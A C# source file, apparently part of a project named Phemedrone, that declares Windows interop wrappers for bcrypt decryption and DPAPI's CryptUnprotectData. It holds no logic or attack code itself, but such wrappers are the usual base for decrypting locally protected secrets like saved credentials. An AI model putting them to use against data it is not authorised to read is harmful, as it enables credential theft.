using System;
using System.Runtime.InteropServices;

namespace Phemedrone.Cryptography
{
    public static class WinApi
    {
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, uint cbInput, IntPtr pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint cbResult, uint dwFlags);

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            IntPtr ppszDataDescr,
            ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            uint dwFlags,
            ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential)]
        public struct DATA_BLOB
        {
            public uint cbData;
            public IntPtr pbData;
        }
    }
}
